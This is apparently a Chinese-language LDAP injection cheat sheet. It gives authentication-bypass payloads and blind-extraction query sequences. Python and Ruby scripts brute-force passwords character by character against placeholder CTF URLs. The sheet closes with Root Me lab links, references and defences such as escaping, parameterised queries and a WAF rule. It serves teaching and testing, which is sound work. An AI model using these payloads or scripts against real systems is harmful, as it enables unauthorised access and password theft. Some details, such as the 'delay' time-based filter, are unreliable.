# LDAP 注入

> LDAP 注入是一种针对基于 Web 的应用程序的攻击方式，这些应用程序根据用户输入构建 LDAP 语句。当应用程序未能正确清理用户输入时，攻击者可以使用本地代理修改 LDAP 语句。

## 目录

* [方法学](#方法学)
    * [认证绕过](#认证绕过)
    * [盲注利用](#盲注利用)
* [默认属性](#默认属性)
* [利用 userPassword 属性](#利用-userpassword-属性)
* [脚本](#脚本)
    * [发现有效 LDAP 字段](#发现有效-ldap-字段)
    * [特殊盲注 LDAP 注入](#特殊盲注-ldap-注入)
* [实验](#实验)
* [参考资料](#参考资料)
* [LDAP 注入原理](#ldap-注入原理)
* [防御措施](#防御措施)

## 方法学

LDAP 注入是一种漏洞，当用户提供的输入在未经适当清理或转义的情况下用于构建 LDAP 查询时就会发生。

### 认证绕过

尝试通过注入始终为真的条件来操纵过滤器逻辑。

**示例 1**：此 LDAP 查询利用查询结构中的逻辑运算符绕过认证

```sql
user  = *)(uid=*))(|(uid=*
pass  = password
query = (&(uid=*)(uid=*))(|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))
```

**示例 2**：此 LDAP 查询利用查询结构中的逻辑运算符绕过认证

```sql
user  = admin)(!(&(1=0
pass  = q))
query = (&(uid=admin)(!(&(1=0)(userPassword=q))))
```

### 盲注利用

此场景展示了使用类似于二分查找或基于字符的暴力破解技术来发现密码等敏感信息的 LDAP 盲注。它依赖于 LDAP 过滤器根据条件是否匹配来响应查询，而不会直接显示实际密码。

```sql
(&(sn=administrator)(password=*))    : 成功
(&(sn=administrator)(password=A*))   : 失败
(&(sn=administrator)(password=B*))   : 失败
...
(&(sn=administrator)(password=M*))   : 成功
(&(sn=administrator)(password=MA*))  : 失败
(&(sn=administrator)(password=MB*))  : 失败
...
(&(sn=administrator)(password=MY*))  : 成功
(&(sn=administrator)(password=MYA*)) : 失败
(&(sn=administrator)(password=MYB*)) : 失败
(&(sn=administrator)(password=MYC*)) : 失败
...
(&(sn=administrator)(password=MYK*)) : 成功
(&(sn=administrator)(password=MYKE)) : 成功
```

### LDAP 注入原理解析

#### 1. 过滤器结构基础

LDAP 过滤器使用前缀表示法（波兰表示法），由以下基本元素组成：

* **逻辑运算符**：
  * `&` - AND (与)，所有条件必须为真
  * `|` - OR (或)，任一条件为真即可
  * `!` - NOT (非)，条件为假时匹配

* **比较运算符**：
  * `=` - 等于
  * `~=` - 约等于（用于模糊匹配）
  * `>=` - 大于等于
  * `<=` - 小于等于

* **通配符**：
  * `*` - 匹配零个或多个字符
  * `\` - 转义字符

#### 2. 认证绕过原理分析

**示例1解析**：
```
原始查询: (&(uid=USER_INPUT)(userPassword=PASSWORD_INPUT))
注入后: (&(uid=*)(uid=*))(|(uid=*)(userPassword={MD5}...))
```

1. 注入点：`USER_INPUT` 被替换为 `*)(uid=*))(|(uid=*`
2. 实际执行：
   - 第一个条件 `(uid=*)` 匹配所有用户
   - 第二个条件 `(uid=*)` 同样匹配所有用户
   - 由于使用了 AND 运算符，整个查询变为 `(&(uid=*)(uid=*))`，始终为真
   - 后面的 `(|(uid=*)(userPassword=...))` 被忽略，因为 LDAP 只处理第一个完整过滤器

**示例2解析**：
```
原始查询: (&(uid=USER_INPUT)(userPassword=PASSWORD_INPUT))
注入后: (&(uid=admin)(!(&(1=0)(userPassword=q))))
```

1. 注入点：`USER_INPUT` 被替换为 `admin)(!(&(1=0`
2. 实际执行：
   - 内部 `&(1=0)` 始终为假
   - `!(&(1=0)...)` 取反后为真
   - 因此整个查询简化为 `(&(uid=admin)(true))`
   - 只要用户 "admin" 存在，认证就会通过

#### 3. 盲注技术详解

盲注利用 LDAP 过滤器的布尔特性来逐步提取信息：

1. **字符集测试**：
   ```
   (&(sn=admin)(password=A*))  // 测试密码是否以A开头
   (&(sn=admin)(password=B*))  // 测试密码是否以B开头
   ...
   ```

2. **二分查找优化**：
   - 对每个字符位置使用二分查找
   - 比较当前字符与中间字符
   - 根据结果调整搜索范围

3. **响应分析**：
   - **True 响应**：查询返回结果，表示条件为真
   - **False 响应**：无结果返回，表示条件为假
   - **错误响应**：语法错误或服务器错误

#### 4. 过滤器注入变体

1. **注释注入**：
   ```
   admin)(uid=*))%00  // 使用空字节截断
   ```

2. **属性注入**：
   ```
   *)(objectClass=*))(&(uid=admin
   ```

3. **时间盲注**：
   ```
   (&(uid=admin)(|(delay=5000)(userPassword=A*)))
   ```

#### 5. 防御机制绕过技术

1. **编码绕过**：
   - URL 编码
   - 十六进制编码
   - Unicode 编码

2. **逻辑混淆**：
   ```
   admin)(|(uid=*)(uid=*  // 使用 OR 条件
   ```

3. **属性名猜测**：
   ```
   *)(|(userpassword=*)(userPassword=*  // 尝试不同大小写
   ```

#### 6. 实际攻击场景

1. **Web 应用认证**：
   - 登录表单注入
   - 密码重置功能
   - 用户搜索功能

2. **API 接口**：
   - RESTful API 参数
   - GraphQL 查询
   - SOAP 请求

3. **内部系统**：
   - 内网管理界面
   - 单点登录系统
   - 目录服务

#### 7. 安全影响

1. **认证绕过**：
   - 无需凭证访问系统
   - 提升权限
   - 绕过多因素认证

2. **信息泄露**：
   - 枚举有效用户
   - 提取密码哈希
   - 获取敏感属性

3. **拒绝服务**：
   - 复杂查询导致服务过载
   - 资源耗尽攻击

#### 8. 检测方法

1. **黑盒测试**：
   - 注入特殊字符：`*` `(` `)` `&` `|` `!`
   - 观察响应差异
   - 检查错误信息

2. **灰盒测试**：
   - 审查源代码
   - 分析日志文件
   - 监控网络流量

3. **自动化工具**：
   - OWASP ZAP
   - Burp Suite
   - SQLmap (支持部分 LDAP 注入)

## 默认属性

可以在注入中使用，如 `*)(ATTRIBUTE_HERE=*`

```bash
userPassword
surname
name
cn
sn
objectClass
mail
givenName
commonName
```

## 利用 userPassword 属性

`userPassword` 属性不是像 `cn` 属性那样的字符串，而是一个 OCTET STRING。
在 LDAP 中，每个对象、类型、操作符等都通过 OID 引用：octetStringOrderingMatch (OID 2.5.13.18)。

> octetStringOrderingMatch (OID 2.5.13.18): 一种排序匹配规则，将对两个八位字节字符串值执行按位比较（大端序），直到找到差异。在一个值中找到一个零位而在另一个值中找到一个一位的第一个情况将被视为零位的值小于一位的值。

```bash
userPassword:2.5.13.18:=\xx (\xx 是一个字节)
userPassword:2.5.13.18:=\xx\xx
userPassword:2.5.13.18:=\xx\xx\xx
```

## 脚本

### 发现有效 LDAP 字段

```python
#!/usr/bin/python3
import requests
import string

fields = []
url = 'https://URL.com/'
f = open('dic', 'r')
world = f.read().split('\n')
f.close()

for i in world:
    r = requests.post(url, data = {'login':'*)('+str(i)+'=*))\x00', 'password':'bla'}) # 类似于 (&(login=*)(ITER_VAL=*))\x00)(password=bla))
    if 'TRUE CONDITION' in r.text:
        fields.append(str(i))

print(fields)
```

### 特殊盲注 LDAP 注入

```python
#!/usr/bin/python3
import requests, string
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

flag = ""
for i in range(50):
    print("[i] 查找第 " + str(i) + " 个字符")
    for char in alphabet:
        r = requests.get("http://ctf.web?action=dir&search=admin*)(password=" + flag + char)
        if ("TRUE CONDITION" in r.text):
            flag += char
            print("[+] 标志: " + flag)
            break
```

由 [@noraj](https://github.com/noraj) 开发的利用脚本

```ruby
#!/usr/bin/env ruby
require 'net/http'
alphabet = [*'a'..'z', *'A'..'Z', *'0'..'9'] + '_@{}-/()!"$%=^[]:;'.split('')

flag = ''
(0..50).each do |i|
  puts("[i] 查找第 #{i} 个字符")
  alphabet.each do |char|
    r = Net::HTTP.get(URI("http://ctf.web?action=dir&search=admin*)(password=#{flag}#{char}"))
    if /TRUE CONDITION/.match?(r)
      flag += char
      puts("[+] 标志: #{flag}")
      break
    end
  end
end
```

## 实验

* [Root Me - LDAP 注入 - 认证](https://www.root-me.org/en/Challenges/Web-Server/LDAP-injection-Authentication)
* [Root Me - LDAP 注入 - 盲注](https://www.root-me.org/en/Challenges/Web-Server/LDAP-injection-Blind)

## 参考资料

* [[欧洲网络安全周] - AdmYSion - Alan Marrec (Maki)](https://www.maki.bzh/writeups/ecw2018admyssion/)
* [ECW 2018 : Write Up - AdmYSsion (WEB - 50) - 0xUKN - 2018年10月31日](https://0xukn.fr/posts/writeupecw2018admyssion/)
* [如何配置 OpenLDAP 并执行 LDAP 管理任务 - Justin Ellingwood - 2015年5月30日](https://www.digitalocean.com/community/tutorials/how-to-configure-openldap-and-perform-administrative-ldap-tasks)
* [如何使用 OpenLDAP 实用程序管理和使用 LDAP 服务器 - Justin Ellingwood - 2015年5月29日](https://www.digitalocean.com/community/tutorials/how-to-manage-and-use-ldap-servers-with-openldap-utilities)
* [LDAP 盲注浏览器 - Alonso Parada - 2011年8月12日](http://code.google.com/p/ldap-blind-explorer/)
* [LDAP 注入与盲注 LDAP 注入 - Chema Alonso, José Parada Gimeno - 2008年10月10日](https://www.blackhat.com/presentations/bh-europe-08/Alonso-Parada/Whitepaper/bh-eu-08-alonso-parada-WP.pdf)
* [LDAP 注入防护速查表 - OWASP - 2019年7月16日](https://www.owasp.org/index.php/LDAP_injection)

## LDAP 注入原理

### 基本概念

LDAP (轻量级目录访问协议) 是一种用于访问和维护分布式目录信息服务的应用协议。LDAP 注入是指攻击者通过构造特殊的输入，改变 LDAP 查询的原始意图，从而绕过安全限制或获取未授权信息。

### 注入点

1. **认证表单**
   - 登录页面
   - 密码重置功能
   - 多因素认证

2. **搜索功能**
   - 用户目录搜索
   - 资源查找
   - 员工目录

3. **配置文件**
   - LDAP 绑定凭据
   - 搜索过滤器配置
   - 属性映射

### 攻击类型

1. **认证绕过**
   - 通过注入 `*)(uid=*))(|(uid=*` 等模式
   - 利用逻辑运算符绕过认证

2. **信息泄露**
   - 枚举有效用户
   - 提取属性信息
   - 获取密码哈希

3. **权限提升**
   - 修改用户属性
   - 添加管理员权限
   - 修改组成员关系

### 技术细节

1. **过滤器注入**
   ```
   (&(uid=admin)(userPassword=password))  // 正常查询
   (&(uid=*)(uid=*))(|(uid=*)(userPassword=*))  // 注入后
   ```

2. **特殊字符**
   - `*` - 通配符
   - `(` 和 `)` - 过滤器分组
   - `&` 和 `|` - 逻辑运算符
   - `!` - 逻辑非
   - `\` - 转义字符

3. **盲注技术**
   - 基于响应的盲注
   - 基于时间的盲注
   - 基于错误的盲注

## 防御措施

### 输入验证

1. **白名单验证**
   ```python
   import re
   
   def is_valid_username(username):
       return bool(re.match(r'^[a-zA-Z0-9_\-@.]{3,30}$', username))
   ```

2. **转义特殊字符**
   ```python
   def escape_ldap_filter(filter_str):
       if not filter_str:
           return ""
       return "".join([f"\\{c}" if c in "*()\\\x00" else c for c in filter_str])
   ```

### 安全配置

1. **最小权限原则**
   - 使用只读绑定账户进行搜索
   - 限制可访问的属性和对象类

2. **LDAP 加固**
   ```
   # 在 OpenLDAP 配置中
   sasl-secprops noanonymous,noplain,noactive,nodict
   security ssf=256
   ```

3. **日志记录与监控**
   - 记录所有 LDAP 操作
   - 监控异常查询模式
   - 设置速率限制

### 安全开发实践

1. **使用参数化查询**
   ```java
   // Java JNDI 示例
   String filter = "(&(uid={0})(userPassword={1}))";
   NamingEnumeration<SearchResult> results = 
       ctx.search("dc=example,dc=com", filter, 
                 new Object[]{username, password}, 
                 new SearchControls());
   ```

2. **预编译过滤器**
   ```python
   # Python-ldap 示例
   import ldap
   from ldap.filter import escape_filter_chars
   
   search_filter = f"(&(uid={escape_filter_chars(username)})(userPassword={escape_filter_chars(password)}))"
   conn.search_s("dc=example,dc=com", ldap.SCOPE_SUBTREE, search_filter)
   ```

3. **Web 应用防火墙 (WAF) 规则**
   ```
   # ModSecurity 规则示例
   SecRule REQUEST_URI "@rx \(\s*\|"
      "id:1000,phase:2,deny,status:400,log,msg:'LDAP Injection Attempt'"
   ```

### 审计与测试

1. **自动化扫描**
   - 使用 OWASP ZAP 或 Burp Suite 进行扫描
   - 检查所有用户输入点

2. **渗透测试**
   - 手动测试认证流程
   - 测试搜索功能
   - 验证错误处理

3. **代码审查**
   - 检查所有 LDAP 查询构建逻辑
   - 验证输入处理
   - 检查错误处理机制
